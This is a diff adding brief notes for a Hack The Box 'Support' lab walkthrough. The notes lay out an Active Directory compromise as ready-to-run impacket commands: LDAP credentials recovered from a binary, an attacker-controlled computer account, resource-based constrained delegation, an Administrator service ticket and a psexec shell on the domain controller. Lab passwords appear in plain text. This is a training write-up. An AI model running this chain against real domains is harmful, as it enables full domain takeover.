@@ -1,0 +1,75 @@
+#############################################
+
+# HTB: Support Walkthrough
+Video: https://youtu.be/QEXostYrmN4
+Box: https://www.hackthebox.com/machines/support
+
+#############################################
+
+#############################################
+
+1️⃣ Running Windows EXE on Linux
+
+#############################################
+
+# Install Mono to run Windows executables
+
+mono UserInfo.exe
+
+# Add IP to /etc/host
+# Intercept with wireshark
+Output (LDAP credentials dump):
+
+ldap:nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz
+
+Using ldap_auth (searching the info as explained in the video) => extracted creds
+
+support:Ironside47pleasure40Watchful
+
+#############################################
+
+2️⃣ Adding a Computer Account
+
+#############################################
+
+Create attacker-controlled computer account
+
+addcomputer.py -method SAMR -computer-name 'strikoder$' -computer-pass 'Abc123###' -dc-ip $IP -dc-host dc.support.htb -domain-netbios support 'support.htb/support:Ironside47pleasure40Watchful'
+
+#############################################
+
+3️⃣ Resource-Based Constrained Delegation (RBCD)
+
+#############################################
+
+Delegate attacker machine to DC
+
+rbcd.py -delegate-from 'strikoder$' -delegate-to 'DC$' -action 'write' 'support.htb/support:Ironside47pleasure40Watchful'
+
+#############################################
+
+4️⃣ Service Ticket (Administrator Impersonation)
+
+#############################################
+
+Get service ticket for Administrator
+
+getST.py -dc-ip $IP -spn cifs/dc.support.htb -impersonate administrator 'support.htb/strikoder$:Abc123###'
+
+#############################################
+
+5️⃣ Ticket Handling
+
+#############################################
+
+# If issues occur, unset env
+unset KRB5CCNAME
+export KRB5CCNAME=administrator@cifs_dc.support.htb@SUPPORT.HTB.ccache
+
+#############################################
+
+6️⃣ Exploitation: PsExec as Administrator
+
+#############################################
+
+psexec.py -dc-ip $IP -k -no-pass support.htb/administrator@dc.support.htb
